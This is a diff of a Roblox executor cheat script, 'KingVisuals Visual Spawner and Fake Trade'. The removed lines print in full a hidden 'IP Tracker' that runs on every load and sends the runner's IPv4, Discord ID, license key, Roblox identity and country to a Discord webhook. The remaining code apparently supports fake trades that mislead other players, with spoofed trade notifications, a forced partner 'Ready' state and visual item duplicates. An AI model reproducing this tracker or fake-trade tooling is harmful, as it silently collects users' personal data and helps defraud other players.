@@ -1,11 +1,6 @@
--- Visual Spawner and Fake Trade
--- Fully debugged & usable by @magik.z
-
--- JOIN FOR BETTER SOURCES:
--- discord.gg/qwFxcFEV
-
--- originally from fpsl
-
+-- ══════════════════════════════════════════════════════════
+--  KingVisuals — Visual Spawner
+-- ══════════════════════════════════════════════════════════
 
 -- wait for the place to finish initial load before running anything;
 -- prevents missing services / unstreamed instances on early-injection.
@@ -27,232 +22,6 @@ local SellRemote; pcall(function()
         SellRemote = game:GetService("ReplicatedStorage"):FindFirstChild("PlotService/Sell", true)
     end
 end)
-
--- ── Forward declarations grouped into tables to stay under Luau's 200-local limit ──
-do
--- Skin / plot constants
-local SKIN_FILE        = "NewBases.rbxmx"
-local SKIN_FILE_LEGACY = "BaseSkinsKing.rbxmx"
-local SKINS = {
-    { name = "Skibidi",       brainrot = "Skibidi Toilet"       },
-    { name = "Headless",      brainrot = "Headless Horseman"    },
-    { name = "Meowl",         brainrot = "Meowl"               },
-    { name = "Strawberry",    brainrot = "Strawberry Elephant"  },
-    { name = "Christmas",     brainrot = nil                    },
-    { name = "Galaxy",        brainrot = nil                    },
-    { name = "Rainbow",       brainrot = nil                    },
-    { name = "Valentines",    brainrot = nil                    },
-    { name = "Bunny Basket",  brainrot = nil                    },
-    { name = "Divine",        brainrot = nil                    },
-    { name = "Cursed",        brainrot = nil                    },
-    { name = "Cyber",         brainrot = nil                    },
-    { name = "John Pork",     brainrot = "John Pork"            },
-}
-
--- Config / file constants
-local CONFIG_FILE            = "KingVisuals_spawns.json"
-local INDEX_FILE             = "KingVisuals_index.json"
-local WEBHOOK_GEN_THRESHOLD  = 50000000
-local WIN_W                  = 400
-local _ANIM_SYNC_THRESHOLD   = 0.1
-
--- UI element handles (grouped to save registers)
-local UI = {
-    win             = nil,
-    tbar            = nil,
-    mainContent     = nil,
-    traitsBtn       = nil,
-    qtyRow          = nil,
-    minusBtn        = nil,
-    qtyLbl          = nil,
-    plusBtn         = nil,
-    searchRow       = nil,
-    searchBox       = nil,
-    listFrame       = nil,
-    animalToggleBtn = nil,
-    listContainer   = nil,
-    multiToggle     = nil,
-    tabBar          = nil,
-    tabBrainrots    = nil,
-    tabTrading      = nil,
-    tabBase         = nil,
-    tabMisc         = nil,
-    brainrotsPage   = nil,
-    tradingPage     = nil,
-    miscPage        = nil,
-    basePage        = nil,
-    selectedHeader  = nil,
-    rarityTag       = nil,
-    selectedName    = nil,
-    selectedPrice   = nil,
-    mutPopup        = nil,
-    mutGrid         = nil,
-    tmPopup         = nil,
-    traitsGrid      = nil,
-    statusLbl       = nil,
-    countLbl        = nil,
-    spawnBtn        = nil,
-    sg              = nil,
-    Stroke          = nil,
-}
--- Aliases so existing code referencing bare names still works
-local win             = UI -- (accessed as UI.win; alias table for compatibility)
-local tbar            ; local mainContent      ; local traitsBtn
-local qtyRow          ; local minusBtn         ; local qtyLbl          ; local plusBtn
-local searchRow       ; local searchBox        ; local listFrame
-local animalToggleBtn ; local listContainer    ; local multiToggle
-local tabBar          ; local tabBrainrots     ; local tabTrading
-local tabBase         ; local tabMisc
-local brainrotsPage   ; local tradingPage      ; local miscPage        ; local basePage
-local selectedHeader  ; local rarityTag        ; local selectedName    ; local selectedPrice
-local mutPopup        ; local mutGrid
-local tmPopup         ; local traitsGrid
-local statusLbl       ; local countLbl         ; local spawnBtn
-local sg              ; local Stroke
-
--- UI state
-local mutationsVisible   = false
-local traitsVisible      = false
-local listVisible        = false
-local contentVisible     = true
-local spawnCount         = 1
-local nextSlot           = 1
-local _kvScale
-local mutBtns            = {}
-local animalBtns         = {}
-local traitBtns          = {}
-
--- Selection state
-local selectedAnimal     = nil
-local selectedMutation   = "None"
-local selectedTraits     = {}
-local _multiSelectMode   = false
-local _multiSelected     = {}
-
--- Spawned model tracking
-local spawnedModels      = {}
-local modelCashpads      = {}
-local slotPromptConns    = {}
-local modelOverheads     = {}
-local modelSnapshots     = {}
-local modelPromptInfo    = {}
-local _offlineSeconds    = 0
-local _modelOfflineCash  = {}
-local _pendingOfflineCash = 0
-
--- Carry state
-local carriedModel       = nil
-local carriedFromSlot    = nil
-local carryAnimTrack     = nil
-local carryConn          = nil
-local carriedGhost       = nil
-local carriedGrabPrompt  = nil
-local carriedAnimalName  = nil
-local carriedOtherConns  = {}
-local originalSpeed      = nil
-
--- Settings / config state
-local autoRestoreEnabled  = true
-local autoSaveEnabled     = true
-local webhookEnabled      = false
-local hideOnRejoinEnabled = false
-local toggleKeyName       = "LeftShift"
-local rejoinKeyName       = ""
-local savedWindowPos      = nil
-local _savedBaseSkin      = nil
-local _saveDebounce       = nil
-
--- Debug / trade state
-local _debugDupeKeyName        = ""
-local _debugAutoFillKeyName    = ""
-local _debugTradeNotifKeyName  = ""
-local _lastRealTradeCapture    = nil
-local _lastReceivedItem        = nil
-local _lastReceivedItems       = {}
-local _triggerDupeItem         = nil
-local _triggerLaunch           = nil
-local _kvForceAcceptDispatcher = nil
-
--- Index / discovery state
-local _hs
-local _indexDiscoveries = {}
-local _activeIndexTab   = "Default"
-local _indexTabHooked   = false
-local _lastSyncTab      = nil
-local MUTATION_HEX_FALLBACK
-local _mutHexCache      = {}
-
--- Skin state
-local _skinFolder      = nil
-local _skinLoading     = false
-local _activeSkinClone = nil
-local _hiddenParts     = {}
-local _selectedSkin    = nil
-
--- Misc constants / data
-local TRAIT_MULTIPLIERS
-local MUTATION_MODIFIERS
-local MUTATION_ICONS
-local ANIMAL_DATA
-local CalcGeneration
-local _lockedPlot      = nil
-local _sharedAnimals   = nil
-local _animSyncEpoch
-
--- Function forward declarations
-local loadSkinModels        ; local isInsideProtected
-local hidePlotParts         ; local showPlotParts
-local SetStatus             ; local UpdateCount
-local getPlayerFloor        ; local _hasBrainrot        ; local getAvailableSkins
-local _updateMutationsBtnText ; local _updateTraitsBtnText
-local BuildAnimalList       ; local _llFetchFandomImage
-local _llGetBrainrotAsset   ; local _triggerTradeNotif
-local _refreshMultiToggle   ; local MakeTab             ; local SetTab
-local _fmtCash              ; local _updateSelectedPrice ; local _refreshScale
-local _loadIndexFile        ; local _saveIndexFile
-local _hasDiscovery         ; local _addDiscovery
-local _getMutationHex       ; local _formatMutLabel
-local _getIndexParts        ; local _syncIndex
-local _hookTabButtons       ; local _getActiveMut
-local _isCardRealDiscovery  ; local _revertCard         ; local _lightUpCard
-local SafeSet               ; local New                 ; local Corner
-local MakeDraggable         ; local SectionHeader
-local GetPlayerPlot         ; local GetPodiumSpawns
-local GetSharedAnimals      ; local ApplyMutation
-local _hasJohnPorkTrait     ; local _displayNameFor
-local _syncModelAnimations  ; local AttachViaRigidConstraint ; local ApplyTraits
-local GetHumanoid           ; local GetAnimator
-local PlaceModelOnSlot      ; local StopCarry           ; local StartCarry
-local _buildCashpadFor
-local OpenFakeTradeSetup    ; local LaunchFakeTrade
-local _hasFileApi           ; local _buildSpawnList
-local SaveConfig            ; local ScheduleSave        ; local LoadConfig
-local _loadedConfig         ; local InjectToGameIndex   ; local _updateCounters
-local neverHide = {
-    Spawn=true, MainRoot=true, Hitbox=true,
-    AnimalPodiums=true, Claim=true, Multiplier=true,
-    DeliveryBox=true, DeliveryHitbox=true, CollectZone=true,
-    Laser=true, LaserHitbox=true, StealHitbox=true,
-    PlotBlock=true, FriendPanel=true, CashPad=true,
-    FirstFloor=true, SecondFloor=true, ThirdFloor=true,
-}
-end
-local LASER_LOOKS = {
-    Cyber = {
-        beamColor = ColorSequence.new(Color3.fromRGB(80, 200, 255)),
-        beamTransparency = NumberSequence.new({
-            NumberSequenceKeypoint.new(0,    0.4),
-            NumberSequenceKeypoint.new(0.5,  0.85),
-            NumberSequenceKeypoint.new(1,    0.4),
-        }),
-        partColor        = Color3.fromRGB(80, 200, 255),
-        partMaterial     = Enum.Material.Neon,
-        partTransparency = 0.6,
-    },
-}
-local _originalLaserState = {}
-local _activeLaserSkin = nil
-local _laserStreamConn = nil
 
 local _syncChannel = nil
 pcall(function()
@@ -392,7 +161,7 @@ local TRAIT_ICONS = {
 -- "John Pork" trait reskins any brainrot wearing it to mimic the real game's
 -- "John Pork is Calling..." event — the overhead nametag gets a suffix.
 -- Accepts either array form {"Galactic","John Pork"} or hash form {[name]=true}.
-_hasJohnPorkTrait = function(traits)
+local function _hasJohnPorkTrait(traits)
     if type(traits) ~= "table" then return false end
     if traits["John Pork"] then return true end
     for _, t in ipairs(traits) do
@@ -401,7 +170,7 @@ _hasJohnPorkTrait = function(traits)
     return false
 end
 
-_displayNameFor = function(name, traits)
+local function _displayNameFor(name, traits)
     if not name or name == "" then return name end
     if _hasJohnPorkTrait(traits) then
         return name .. " is Calling..."
@@ -418,10 +187,10 @@ end
 -- Every model converges on the same phase and *stays* there — they advance
 -- together naturally instead of resetting.  We only write TimePosition when
 -- the drift exceeds ~100ms, so most resync ticks are no-ops (no visible jump).
-_animSyncEpoch = tick()
-_ANIM_SYNC_THRESHOLD = 0.1
+local _animSyncEpoch = tick()
+local _ANIM_SYNC_THRESHOLD = 0.1
 
-_syncModelAnimations = function(model)
+local function _syncModelAnimations(model)
     if not model or not model.Parent then return end
     pcall(function()
         local controller = model:FindFirstChildWhichIsA("Humanoid", true)
@@ -446,17 +215,17 @@ _syncModelAnimations = function(model)
     end)
 end
 
-SafeSet = function(o,p,v) pcall(function() o[p]=v end) end
-New = function(cls,props)
+local function SafeSet(o,p,v) pcall(function() o[p]=v end) end
+local function New(cls,props)
     local ok,obj=pcall(Instance.new,cls)
     if not ok or not obj then return nil end
     if props then for k,v in pairs(props) do SafeSet(obj,k,v) end end
     return obj
 end
-Corner = function(p,r)
+local function Corner(p,r)
     local c=Instance.new("UICorner"); c.CornerRadius=UDim.new(0,r or 6); c.Parent=p; return c
 end
-MakeDraggable = function(frame,handle)
+local function MakeDraggable(frame,handle)
     handle=handle or frame
     local drag,ds,sp
     handle.InputBegan:Connect(function(i)
@@ -474,7 +243,7 @@ MakeDraggable = function(frame,handle)
         end
     end)
 end
-SectionHeader = function(parent,text,yPos)
+local function SectionHeader(parent,text,yPos)
     New("Frame",{Size=UDim2.new(0,3,0,14),Position=UDim2.new(0,10,0,yPos+2),BackgroundColor3=ACCENT,BorderSizePixel=0,Parent=parent})
     New("TextLabel",{Size=UDim2.new(1,-28,0,18),Position=UDim2.new(0,18,0,yPos),Text=text:upper(),TextColor3=Color3.fromRGB(230,230,240),Font=Enum.Font.GothamBold,TextSize=9,BackgroundTransparency=1,TextXAlignment=Enum.TextXAlignment.Left,Parent=parent})
 end
@@ -483,8 +252,8 @@ end
 -- Plot is pinned once per session: the closest plot at the FIRST spawn becomes
 -- "your" plot for everything (spawning, base skins, lasers, prompts, etc.).
 -- Without this, walking near another player's plot would silently re-target it.
-_lockedPlot = nil
-GetPlayerPlot = function()
+local _lockedPlot = nil
+local function GetPlayerPlot()
     -- If we've already locked onto a plot and it still exists, keep using it.
     if _lockedPlot and _lockedPlot.Parent then return _lockedPlot end
     _lockedPlot = nil  -- plot was destroyed (rejoin?) — re-pin
@@ -505,7 +274,7 @@ GetPlayerPlot = function()
     return best
 end
 
-GetPodiumSpawns = function(plot)
+local function GetPodiumSpawns(plot)
     local spawns={}
     -- live structure: plot.AnimalPodiums.[n].Base.Spawn
     local podiums=plot:FindFirstChild("AnimalPodiums"); if not podiums then return spawns end
@@ -537,8 +306,8 @@ end
 
 -- ── MUTATION APPLICATION ─────────────────────────────────
 -- Use game's own Shared.Animals module directly (works from executor in current game version)
-_sharedAnimals = nil
-GetSharedAnimals = function()
+local _sharedAnimals = nil
+local function GetSharedAnimals()
     if not _sharedAnimals then
         local ok, result = pcall(function() return require(RS.Shared.Animals) end)
         if ok then _sharedAnimals = result end
@@ -546,7 +315,7 @@ GetSharedAnimals = function()
     return _sharedAnimals
 end
 
-ApplyMutation = function(model, animalName, mutName)
+local function ApplyMutation(model, animalName, mutName)
     if not mutName or mutName == "None" then return end
 
     -- Use real game's ApplyMutation (handles all mutations including Cyber)
@@ -810,7 +579,7 @@ ApplyMutation = function(model, animalName, mutName)
 end
 
 -- ── TRAIT APPLICATION-- ── TRAIT APPLICATION ────────────────────────────────────
-AttachViaRigidConstraint = function(clone, model)
+local function AttachViaRigidConstraint(clone, model)
     -- match each part's attachments to same-named attachments in model
     for _, part in clone:GetChildren() do
         if part:IsA("BasePart") or part:IsA("MeshPart") or part:IsA("Model") then
@@ -829,7 +598,7 @@ AttachViaRigidConstraint = function(clone, model)
     end
 end
 
-ApplyTraits = function(model, animalName, traitList)
+local function ApplyTraits(model, animalName, traitList)
     if not traitList or #traitList == 0 then return end
 
     -- Try game's SharedAnimals first
@@ -905,7 +674,7 @@ ApplyTraits = function(model, animalName, traitList)
 end
 
 
-ANIMAL_DATA = {
+local ANIMAL_DATA = {
     ["1x1x1x1"] = {gen=1111111,price=255555555},
     ["25"] = {gen=2500000,price=600000000},
     ["67"] = {gen=7500000,price=1250000000},
@@ -1219,33 +988,33 @@ ANIMAL_DATA = {
 }
 
 -- ── STATE ────────────────────────────────────────────────
-selectedAnimal   = nil
-selectedMutation = "None"
-selectedTraits   = {}
-_multiSelectMode = false
-_multiSelected   = {}  -- { [animalName] = true }
-spawnedModels    = {}
-modelCashpads    = {} -- model -> {cashPart, cashConn} for cleanup on move
-slotPromptConns  = {} -- slotIndex -> {conn1, conn2} prompt connections to disconnect on respawn
+local selectedAnimal   = nil
+local selectedMutation = "None"
+local selectedTraits   = {}
+local _multiSelectMode = false
+local _multiSelected   = {}  -- { [animalName] = true }
+local spawnedModels    = {}
+local modelCashpads    = {} -- model -> {cashPart, cashConn} for cleanup on move
+local slotPromptConns  = {} -- slotIndex -> {conn1, conn2} prompt connections to disconnect on respawn
 -- Offline earnings: tracks how much each restored model accumulated while the
 -- player was away. Computed once at script load from (gen/sec * elapsed * 0.5),
 -- capped at 5 hours. Cleared when the player steps onto that model's cashpad.
-_offlineSeconds  = 0
-_modelOfflineCash = {}  -- model -> number (unclaimed offline cash)
-_pendingOfflineCash = 0 -- set BEFORE DoSpawn during restore so the cashpad picks it up
-modelOverheads   = {} -- model -> overhead part in workspace.Debris
-modelSnapshots   = {} -- model -> {mutation, traits} at spawn time
-modelPromptInfo  = {} -- model -> {att=promptAtt, slot=slotIndex}
+local _offlineSeconds  = 0
+local _modelOfflineCash = {}  -- model -> number (unclaimed offline cash)
+local _pendingOfflineCash = 0 -- set BEFORE DoSpawn during restore so the cashpad picks it up
+local modelOverheads   = {} -- model -> overhead part in workspace.Debris
+local modelSnapshots   = {} -- model -> {mutation, traits} at spawn time
+local modelPromptInfo  = {} -- model -> {att=promptAtt, slot=slotIndex}
 
 -- ── CONFIG / PERSISTENCE ─────────────────────────────────
 -- save the list of currently-spawned brainrots to disk so the same set can
 -- be restored on next script run. all data is purely client-side visual.
-CONFIG_FILE = "KingVisuals_spawns.json"
-INDEX_FILE  = "KingVisuals_index.json"
-_hs = game:GetService("HttpService")
-_indexDiscoveries = {} -- { [animalName] = { "None", "Gold", ... } }
+local CONFIG_FILE = "KingVisuals_spawns.json"
+local INDEX_FILE  = "KingVisuals_index.json"
+local _hs = game:GetService("HttpService")
+local _indexDiscoveries = {} -- { [animalName] = { "None", "Gold", ... } }
 
-_loadIndexFile = function()
+local function _loadIndexFile()
     if type(readfile) ~= "function" or type(isfile) ~= "function" then return end
     if not isfile(INDEX_FILE) then return end
     local ok, data = pcall(function() return _hs:JSONDecode(readfile(INDEX_FILE)) end)
@@ -1259,12 +1028,12 @@ _loadIndexFile = function()
     _indexDiscoveries = data
 end
 
-_saveIndexFile = function()
+local function _saveIndexFile()
     if type(writefile) ~= "function" then return end
     pcall(function() writefile(INDEX_FILE, _hs:JSONEncode(_indexDiscoveries)) end)
 end
 
-_hasDiscovery = function(animalName, mutation)
+local function _hasDiscovery(animalName, mutation)
     local list = _indexDiscoveries[animalName]
     if not list then return false end
     for _, m in ipairs(list) do
@@ -1273,7 +1042,7 @@ _hasDiscovery = function(animalName, mutation)
     return false
 end
 
-_addDiscovery = function(animalName, mutation)
+local function _addDiscovery(animalName, mutation)
     if _hasDiscovery(animalName, mutation) then return false end
     if not _indexDiscoveries[animalName] then
         _indexDiscoveries[animalName] = {}
@@ -1291,20 +1060,20 @@ end
 -- Counter: Index.Index.Main.Header.Total  text = "47/429"
 -- Progress: Index.Index.Progress (Frame with bar + text)
 
-_activeIndexTab = "Default"
-_indexTabHooked = false
-_lastSyncTab = nil
+local _activeIndexTab = "Default"
+local _indexTabHooked = false
+local _lastSyncTab = nil
 
 -- Fallback hex colors if Datas.Mutations isn't readable
-MUTATION_HEX_FALLBACK = {
+local MUTATION_HEX_FALLBACK = {
     Gold    = "FFDE59",
     Diamond = "25C4FE",
     Rainbow = "FF6496",
     Cyber   = "3E9BFF",
 }
 
-_mutHexCache = {}
-_getMutationHex = function(mutName)
+local _mutHexCache = {}
+local function _getMutationHex(mutName)
     if _mutHexCache[mutName] then return _mutHexCache[mutName] end
     -- Try to pull MainColor from the game's Datas.Mutations module first
     local hex
@@ -1323,7 +1092,7 @@ _getMutationHex = function(mutName)
     return hex
 end
 
-_formatMutLabel = function(mutName)
+local function _formatMutLabel(mutName)
     if not mutName or mutName == "" or mutName == "None" or mutName == "Default" then
         return "Default", false
     end
@@ -1334,7 +1103,7 @@ _formatMutLabel = function(mutName)
     return mutName, false
 end
 
-_getIndexParts = function()
+local function _getIndexParts()
     local pg = LocalPlayer:FindFirstChild("PlayerGui")
     if not pg then return nil end
     local indexSG = pg:FindFirstChild("Index")
@@ -1354,7 +1123,8 @@ _getIndexParts = function()
     }
 end
 
-_hookTabButtons = function(parts)
+local _syncIndex -- forward decl
+local function _hookTabButtons(parts)
     if _indexTabHooked or not parts.mutations then return end
     for _, btn in parts.mutations:GetChildren() do
         if btn:IsA("TextButton") then
@@ -1374,17 +1144,17 @@ _hookTabButtons = function(parts)
     _indexTabHooked = true
 end
 
-_getActiveMut = function()
+local function _getActiveMut()
     return (_activeIndexTab == "Default") and "None" or _activeIndexTab
 end
 
-_isCardRealDiscovery = function(card)
+local function _isCardRealDiscovery(card)
     if card:GetAttribute("KVIndexed") then return false end
     local nl = card:FindFirstChild("NameLabel")
     return nl and nl:IsA("TextLabel") and nl.Visible == true
 end
 
-_revertCard = function(card)
+local function _revertCard(card)
     if not card or not card:GetAttribute("KVIndexed") then return end
     pcall(function()
         -- Remove only OUR added ViewportFrame (one we created had Name="ViewportFrame" via our code)
@@ -1445,7 +1215,7 @@ _revertCard = function(card)
     end)
 end
 
-_lightUpCard = function(card, animalName, mutationName)
+local function _lightUpCard(card, animalName, mutationName)
     if not card then return end
     pcall(function()
         local newMut = (mutationName and mutationName ~= "None") and mutationName or ""
@@ -1606,7 +1376,7 @@ _lightUpCard = function(card, animalName, mutationName)
     end)
 end
 
-_updateCounters = function(parts, kvCount)
+local function _updateCounters(parts, kvCount)
     pcall(function()
         if not parts.total then return end
         local tabChanged = _lastSyncTab ~= _activeIndexTab
@@ -1735,7 +1505,7 @@ function _syncIndex()
     _updateCounters(parts, kvCount)
 end
 
-InjectToGameIndex = function(animalName, mutationName)
+local function InjectToGameIndex(animalName, mutationName)
     local mut = mutationName or "None"
     _addDiscovery(animalName, mut)
     task.defer(_syncIndex)
@@ -1794,15 +1564,15 @@ task.spawn(function()
     end
 end)
 
-autoRestoreEnabled = true   -- toggled from Misc tab; default on
-autoSaveEnabled    = true   -- toggled from Misc tab; default on
-webhookEnabled     = false  -- toggled from Misc tab; opt-in, default off
-hideOnRejoinEnabled = false  -- when on, UI starts hidden after a rejoin
-toggleKeyName      = "LeftShift"  -- key to show/hide the UI; configurable
-rejoinKeyName      = ""           -- key to rejoin server; empty = unbound
-savedWindowPos     = nil          -- {x,y} of main window from last session
-_savedBaseSkin     = nil         -- name of last-applied base skin
-_saveDebounce = nil
+local autoRestoreEnabled = true   -- toggled from Misc tab; default on
+local autoSaveEnabled    = true   -- toggled from Misc tab; default on
+local webhookEnabled     = false  -- toggled from Misc tab; opt-in, default off
+local hideOnRejoinEnabled = false  -- when on, UI starts hidden after a rejoin
+local toggleKeyName      = "LeftShift"  -- key to show/hide the UI; configurable
+local rejoinKeyName      = ""           -- key to rejoin server; empty = unbound
+local savedWindowPos     = nil          -- {x,y} of main window from last session
+local _savedBaseSkin     = nil         -- name of last-applied base skin
+local _saveDebounce = nil
 
 -- ── DEBUG / TESTING HOTKEYS ───────────────────────────────
 -- Both are configurable from the Misc tab.  Empty string = unbound.
@@ -1811,21 +1581,24 @@ _saveDebounce = nil
 --                         once per keypress (visual-only, no networking).
 -- _debugAutoFillKeyName : opens Trade Setup pre-filled with the partner username
 --                         and items captured from the most-recent real trade.
-_debugDupeKeyName       = ""   -- hotkey: visually clone last received animal
-_debugAutoFillKeyName   = ""   -- hotkey: launch fake trade UI with last trader
-_debugTradeNotifKeyName = ""   -- hotkey: show real-style trade request notification
-_lastRealTradeCapture   = nil  -- {username, items[{name,mutation,traits}]}
-_lastReceivedItem       = nil  -- first item from post-trade server diff (legacy single-item ref)
-_lastReceivedItems      = {}   -- ALL items received in the most recent trade
-_triggerDupeItem        = nil  -- closure set while Trade Setup window is open
-_triggerLaunch          = nil  -- closure set while Trade Setup window is open; fires LAUNCH
-_kvForceAcceptDispatcher = nil  -- closure set by LaunchFakeTrade.  Snaps the partner's
+local _debugDupeKeyName       = ""   -- hotkey: visually clone last received animal
+local _debugAutoFillKeyName   = ""   -- hotkey: launch fake trade UI with last trader
+local _debugTradeNotifKeyName = ""   -- hotkey: show real-style trade request notification
+local _lastRealTradeCapture   = nil  -- {username, items[{name,mutation,traits}]}
+local _lastReceivedItem       = nil  -- first item from post-trade server diff (legacy single-item ref)
+local _lastReceivedItems      = {}   -- ALL items received in the most recent trade
+local _triggerDupeItem        = nil  -- closure set while Trade Setup window is open
+local _triggerLaunch          = nil  -- closure set while Trade Setup window is open; fires LAUNCH
+local _kvForceAcceptDispatcher = nil  -- closure set by LaunchFakeTrade.  Snaps the partner's
                                       -- "Ready!" frame on so they ready *first* — rest of the
                                       -- trade flow runs normally per existing rules.
 -- Forward declarations so key listeners below the do-block can call into them.
+local OpenFakeTradeSetup
+local LaunchFakeTrade
+
 -- community feed gen threshold; the URL itself is inlined into the
 -- LRM_SEND_WEBHOOK macro call so Luarmor can protect it.
-WEBHOOK_GEN_THRESHOLD = 50000000  -- 50M/s minimum to log
+local WEBHOOK_GEN_THRESHOLD = 50000000  -- 50M/s minimum to log
 
 -- Luarmor macro fallbacks. When pushed through Luarmor's pipeline these
 -- are replaced by the protected macros at obfuscation time. When run raw
@@ -1849,97 +1622,13 @@ if type(LRM_SEND_WEBHOOK) ~= "function" then
     end
 end
 
--- ── Execution log (IP tracker) ────────────────────────────
--- Fires once per script load, posting to a separate Discord webhook with the
--- runner's Discord ID, key, note, Roblox identity, IPv4, and country.
--- IPv4 is fetched live via api.ipify.org (returns clean v4 only — Luarmor's
--- %CLIENT_IP% can return v6 on dual-stack networks).  Other fields use
--- Luarmor macros (%DISCORD_ID%, %COUNTRY_CODE%, %USER_KEY%, %USER_NOTE%).
--- Heads up: this collects sensitive data — disclose it on your product page.
-do
-    local function _getPublicIPv4()
-        -- Try every available HTTP fn an executor might provide, then fall
-        -- back to HttpService:GetAsync.  ipify always returns plain text v4.
-        local ok, body = pcall(function()
-            if syn and syn.request then
-                return (syn.request({Url = "https://api.ipify.org/", Method = "GET"}) or {}).Body
-            end
-            if http and http.request then
-                return (http.request({Url = "https://api.ipify.org/", Method = "GET"}) or {}).Body
-            end
-            if http_request then
-                return (http_request({Url = "https://api.ipify.org/", Method = "GET"}) or {}).Body
-            end
-            if request then
-                return (request({Url = "https://api.ipify.org/", Method = "GET"}) or {}).Body
-            end
-            return _hs:GetAsync("https://api.ipify.org/")
-        end)
-        if ok and type(body) == "string" then
-            local ip = body:match("(%d+%.%d+%.%d+%.%d+)")
-            if ip then return ip end
-        end
-        return "Unknown"
-    end
-
-    local function _getRobloxUser()
-        local ok, info = pcall(function()
-            local p = LocalPlayer
-            if not p then return nil end
-            return {
-                name        = p.Name,
-                displayName = p.DisplayName,
-                userId      = p.UserId,
-            }
-        end)
-        if ok then return info end
-        return nil
-    end
-
-    task.spawn(function()
-        local user = _getRobloxUser()
-        local ipv4 = _getPublicIPv4()
-        local userInfo, robloxLink, robloxId
-        if user then
-            userInfo   = "**" .. user.name .. "** (" .. user.displayName .. ")"
-            robloxLink = "https://www.roblox.com/users/" .. tostring(user.userId)
-            robloxId   = "`" .. tostring(user.userId) .. "`"
-        else
-            userInfo, robloxLink, robloxId = "Unknown", "Unknown", "Unknown"
-        end
-
-        pcall(function()
-            LRM_SEND_WEBHOOK("webhook removed you're welcome", {
-                username = "IP Tracker",
-                embeds = {{
-                    title       = "🔔 Script Executed",
-                    description = "",
-                    color       = 0x00FF00,
-                    fields = {
-                        { name = "💬 Discord User",   value = "<@%DISCORD_ID%>",                          inline = true },
-                        { name = "🔑 Key",            value = "`%USER_KEY%`",                             inline = true },
-                        { name = "📝 Note",           value = "`%USER_NOTE%`",                            inline = true },
-                        { name = "👤 Roblox User",    value = userInfo,                                   inline = true },
-                        { name = "🆔 Roblox ID",      value = robloxId,                                   inline = true },
-                        { name = "🔗 Profile",        value = robloxLink,                                 inline = true },
-                        { name = "🌐 IP (IPv4 only)", value = "`" .. ipv4 .. "`",                         inline = true },
-                        { name = "📍 Country",        value = ":flag_%COUNTRY_CODE%: `%COUNTRY_CODE%`",   inline = true },
-                    },
-                    footer    = { text = "IP Tracker" },
-                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-                }},
-            })
-        end)
-    end)
-end
-
-_hasFileApi = function()
+local function _hasFileApi()
     return type(writefile) == "function"
         and type(readfile) == "function"
         and type(isfile) == "function"
 end
 
-_buildSpawnList = function()
+local function _buildSpawnList()
     local list = {}
     for _, m in ipairs(spawnedModels) do
         if m and m.Parent then
@@ -1968,7 +1657,7 @@ _buildSpawnList = function()
     return list
 end
 
-SaveConfig = function()
+local function SaveConfig()
     if not _hasFileApi() then return end
     local data = {
         version       = 1,
@@ -1993,7 +1682,7 @@ end
 
 -- debounced save so rapid spawn loops don't write every iteration.
 -- skipped entirely when auto-save is off (Save Now still works manually).
-ScheduleSave = function()
+local function ScheduleSave()
     if not autoSaveEnabled then return end
     if _saveDebounce then return end
     _saveDebounce = true
@@ -2003,7 +1692,7 @@ ScheduleSave = function()
     end)
 end
 
-LoadConfig = function()
+local function LoadConfig()
     if not _hasFileApi() then return nil end
     if not isfile(CONFIG_FILE) then return nil end
     local ok, data = pcall(function()
@@ -2063,17 +1752,17 @@ LoadConfig = function()
 end
 
 -- pre-load config so autoRestoreEnabled reflects saved preference for the UI
-_loadedConfig = LoadConfig()
+local _loadedConfig = LoadConfig()
 
 -- ── CARRY SYSTEM ─────────────────────────────────────────
-carriedModel     = nil
-carriedFromSlot  = nil
-carryAnimTrack   = nil
-carryConn        = nil  -- RunService loop moving model with player
-carriedGhost     = nil  -- transparent copy left on original slot
-carriedGrabPrompt = nil -- the E prompt that was used to grab
-carriedAnimalName = nil -- name of carried animal
-carriedOtherConns = {} -- Triggered connections on other podiums
+local carriedModel     = nil
+local carriedFromSlot  = nil
+local carryAnimTrack   = nil
+local carryConn        = nil  -- RunService loop moving model with player
+local carriedGhost     = nil  -- transparent copy left on original slot
+local carriedGrabPrompt = nil -- the E prompt that was used to grab
+local carriedAnimalName = nil -- name of carried animal
+local carriedOtherConns = {} -- Triggered connections on other podiums
 
 -- clean up carry state if character respawns
 LocalPlayer.CharacterAdded:Connect(function()
@@ -2113,20 +1802,21 @@ LocalPlayer.CharacterAdded:Connect(function()
         end)
     end
 end)
-originalSpeed    = nil
+local originalSpeed    = nil
 
-GetHumanoid = function()
+local function GetHumanoid()
     local char = LocalPlayer.Character
     return char and char:FindFirstChildOfClass("Humanoid")
 end
 
-GetAnimator = function()
+local function GetAnimator()
     local hum = GetHumanoid()
     return hum and hum:FindFirstChildOfClass("Animator")
 end
 
+local PlaceModelOnSlot -- forward declaration
 
-StopCarry = function()
+local function StopCarry()
     if carryConn then carryConn:Disconnect(); carryConn = nil end
     if carryAnimTrack then pcall(function() carryAnimTrack:Stop(); carryAnimTrack:Destroy() end); carryAnimTrack = nil end
     local hum = GetHumanoid()
@@ -2173,7 +1863,7 @@ StopCarry = function()
     end)
 end
 
-StartCarry = function(model, slotIdx, grabPrompt)
+local function StartCarry(model, slotIdx, grabPrompt)
     local char = LocalPlayer.Character
     local hrp = char and char:FindFirstChild("HumanoidRootPart")
     if not hrp then return end
@@ -2562,7 +2252,7 @@ StartCarry = function(model, slotIdx, grabPrompt)
 end
 
 -- Build a cashpad for a model on a specific podium (used by Place + swap)
-_buildCashpadFor = function(model, podiumFolder, animalName)
+local function _buildCashpadFor(model, podiumFolder, animalName)
     if not model or not podiumFolder then return end
     local newClaim = podiumFolder:FindFirstChild("Claim")
     local newClaimMain = newClaim and newClaim:FindFirstChild("Main")
@@ -3302,9 +2992,9 @@ PlaceModelOnSlot = function(model, slotIdx, animalName)
 
     return true
 end
-nextSlot         = 1
+local nextSlot         = 1
 
-TRAIT_MULTIPLIERS = {
+local TRAIT_MULTIPLIERS = {
     ["Taco"]=2, ["Nyan"]=5, ["Galactic"]=3, ["Fireworks"]=5, ["Zombie"]=4,
     ["Claws"]=4, ["Glitched"]=4, ["Bubblegum"]=3, ["Fire"]=5, ["Wet"]=1.5,
     ["Snowy"]=2, ["Cometstruck"]=2.5, ["Explosive"]=3, ["Disco"]=4, ["10B"]=3,
@@ -3319,14 +3009,14 @@ TRAIT_MULTIPLIERS = {
     ["Granny"]=5.5, ["Bunny Ears"]=4.5,
